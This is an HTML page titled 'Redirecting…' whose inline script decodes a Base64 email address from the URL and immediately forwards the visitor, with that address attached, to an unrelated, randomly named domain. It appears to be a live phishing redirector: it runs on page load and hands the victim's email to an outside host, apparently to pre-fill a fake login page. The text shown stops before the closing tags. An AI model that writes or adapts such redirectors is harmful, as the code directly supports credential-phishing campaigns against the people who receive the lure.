<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Redirecting…</title>
  <script>
    // Decode a Base64 string into a UTF-8 JavaScript string.
    // Handles both standard (+/) and URL-safe (-_) alphabets and missing padding.
    function decodeBase64Utf8(value) {
      let s = value.replace(/-/g, "+").replace(/_/g, "/").replace(/\s/g, "").trim();
      while (s.length % 4 !== 0) {
        s += "=";
      }
      const binary = atob(s); // throws on invalid Base64
      const bytes = Uint8Array.from(binary, (c) => c.charCodeAt(0));
      return new TextDecoder().decode(bytes);
    }

    function isValidEmail(value) {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
    }

    function getEmailFromURL() {
      const params = new URLSearchParams(window.location.search);
      // Upstream forwards the value as `e`; fall back to `state` for compatibility.
      const raw = params.get("state") || params.get("e");
      if (!raw) return null;

      // Base64 may contain '+', which a naive query parser turns into a space.
      const candidates = raw.indexOf(" ") === -1 ? [raw] : [raw.replace(/ /g, "+"), raw];

      for (const value of candidates) {
        try {
          const decoded = decodeBase64Utf8(value);
          if (isValidEmail(decoded)) return decoded;
        } catch (e) {
          // Not valid Base64 — fall through to the plain-text check.
        }
      }

      return isValidEmail(raw) ? raw : null;
    }

    const email = getEmailFromURL();

    if (email) {
      window.location.replace(
        "https://unequaled523.hazelihill.com.de/reconsecrate274/?email=" +
          encodeURIComponent(email)
      );
    } else {
      console.log("No valid email found in state parameter.");
    }
  </script>
